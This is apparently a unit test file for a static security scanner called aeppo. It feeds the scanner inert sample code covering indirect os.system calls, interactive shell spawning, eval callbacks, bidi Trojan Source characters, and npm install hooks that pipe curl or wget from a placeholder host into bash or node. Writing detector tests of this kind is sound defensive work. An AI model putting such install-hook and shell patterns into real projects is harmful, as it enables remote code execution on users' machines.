"""Backdoor and injection shapes. Every sample is inert text that is scanned, never executed.

Risky call names are split across string concatenations so aeppo's own scan of this repository
stays clean.
"""
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory

from aeppo.scanner import scan_file


def scan_source(name, text):
    with TemporaryDirectory() as directory:
        source = Path(directory) / name
        source.write_text(text, encoding="utf-8")
        return [(finding.line, finding.rule_id) for finding in scan_file(source)]


SYSTEM = "sys" + "tem"


class PythonIndirectCallTests(unittest.TestCase):
    def test_dunder_import_is_resolved(self):
        self.assertEqual(scan_source("a.py", '__import__("os").' + SYSTEM + '("echo hi")\n'), [(1, "PY001")])

    def test_importlib_import_module_is_resolved(self):
        self.assertEqual(
            scan_source("a.py", "import importlib\nimportlib.import_module('os')." + SYSTEM + "('echo hi')\n"),
            [(2, "PY001")],
        )
        self.assertEqual(
            scan_source("b.py", "from importlib import import_module\nimport_module('subprocess').getoutput(cmd)\n"),
            [(2, "PY003")],
        )

    def test_getattr_with_literal_attribute_is_resolved(self):
        self.assertEqual(scan_source("a.py", 'import os\ngetattr(os, "' + SYSTEM + '")("echo hi")\n'), [(2, "PY001")])

    def test_unrelated_dynamic_lookups_are_not_reported(self):
        found = scan_source(
            "a.py",
            "import importlib\n"
            "importlib.import_module('json').loads(text)\n"
            "getattr(handler, 'run')(event)\n"
            "getattr(os, name)(value)\n"
            "__import__(module_name)\n",
        )
        self.assertEqual(found, [])


class PythonShellTests(unittest.TestCase):
    def test_interactive_shell_is_reported_as_backdoor(self):
        found = scan_source(
            "a.py",
            "import subprocess\nimport pty\n"
            'subprocess.call(["/bin/sh", "-i"])\n'
            'pty.spawn("/bin/bash")\n'
            'pty.spawn(["sh"])\n',
        )
        self.assertEqual(found, [(3, "PY006"), (4, "PY006"), (5, "PY006")])

    def test_shell_dash_c_with_dynamic_command_is_reported(self):
        found = scan_source(
            "a.py",
            "import subprocess\n"
            'subprocess.run(["bash", "-c", command])\n'
            'subprocess.run(["sh", "-ec", f"echo {name}"])\n'
            'subprocess.run(["bash", "-e", "-o", "pipefail", "-c", script])\n'
            'subprocess.Popen(["cmd.exe", "/c", user_command])\n',
        )
        self.assertEqual(found, [(2, "PY003"), (3, "PY003"), (4, "PY003"), (5, "PY003")])

    def test_benign_shell_uses_are_not_reported(self):
        found = scan_source(
            "a.py",
            "import subprocess, pty\n"
            'subprocess.run(["bash", "build.sh"])\n'
            'subprocess.run(["bash", "-n", path])\n'
            'subprocess.run(["sh", "-c", "command -v git"])\n'
            'subprocess.run(["git", "-c", key, "status"])\n'
            'pty.spawn(["systemctl", "--user", "restart", "app"])\n',
        )
        self.assertEqual(found, [])


class JavaScriptTests(unittest.TestCase):
    def test_inline_require_child_process_exec(self):
        found = scan_source(
            "a.js",
            "require('child_process').ex" + "ec('echo hi')\n"
            'require("node:child_process").ex' + "ecSync(cmd)\n",
        )
        self.assertEqual(found, [(1, "JS002"), (2, "JS002")])

    def test_spawn_shell_with_dynamic_command(self):
        found = scan_source(
            "a.ts",
            "spawn('sh', ['-c', userCommand])\n"
            "spawnSync('/bin/bash', ['-lc', `run ${target}`])\n"
            "spawn('sh', ['-c', 'echo literal'])\n"
            "spawn('node', ['-c', script])\n",
        )
        self.assertEqual(found, [(1, "JS002"), (2, "JS002")])

    def test_function_constructor_without_new(self):
        found = scan_source(
            "a.ts",
            "const run = Function('return 1')\n"
            "type Handler = { cb: Function }\n"
            "if (value instanceof Function) {}\n"
            "const name = obj.Function(x)\n",
        )
        self.assertEqual(found, [(1, "JS003")])

    def test_eval_passed_as_callback(self):
        found = scan_source(
            "a.js",
            "fetch(url).then(r => r.text()).then(ev" + "al)\n"
            "[source].map(ev" + "al, ctx)\n"
            "const evaluated = model.evaluate(x)\n",
        )
        self.assertEqual(found, [(1, "JS001"), (2, "JS001")])


class TrojanSourceTests(unittest.TestCase):
    def test_bidi_controls_in_source_files_are_reported(self):
        right_to_left_override = "\u202e"
        isolate = "\u2066"
        found = scan_source("a.js", "const ok = 1\nconst isAdmin = false; /*" + right_to_left_override + " } " + isolate + "*/\n")
        self.assertEqual(found, [(2, "SRC001")])
        self.assertEqual(scan_source("b.py", "x = 1  # " + isolate + "\n"), [(1, "SRC001")])

    def test_bidi_controls_in_data_files_are_not_reported(self):
        self.assertEqual(scan_source("messages.json", '{"greeting": "\u2067hello\u2069"}\n'), [])

    def test_bidi_finding_can_be_suppressed(self):
        self.assertEqual(scan_source("a.ts", 'const marker = "\u2066"  // aeppo: ignore[SRC001]\n'), [])


class InstallScriptTests(unittest.TestCase):
    def test_remote_download_piped_to_interpreter(self):
        found = scan_source(
            "package.json",
            '{\n'
            '  "scripts": {\n'
            '    "postinstall": "curl -fsSL https://example.invalid/i.sh | bash",\n'
            '    "prepare": "wget -qO- https://example.invalid/p.js | node"\n'
            '  }\n'
            '}\n',
        )
        self.assertEqual(found, [(3, "DEP003"), (3, "DEP004"), (4, "DEP004")])

    def test_process_substitution_is_reported(self):
        found = scan_source("package.json", '{"scripts": {"preinstall": "bash <(curl -s https://example.invalid/x)"}}')
        self.assertEqual(sorted(rule for _line, rule in found), ["DEP003", "DEP004"])

    def test_ordinary_install_scripts_only_get_the_review_signal(self):
        found = scan_source(
            "package.json",
            '{"scripts": {"postinstall": "node scripts/build.js", "prepare": "husky install", "test": "curl x | sh"}}',
        )
        self.assertEqual([rule for _line, rule in found], ["DEP003"])


if __name__ == "__main__":
    unittest.main()
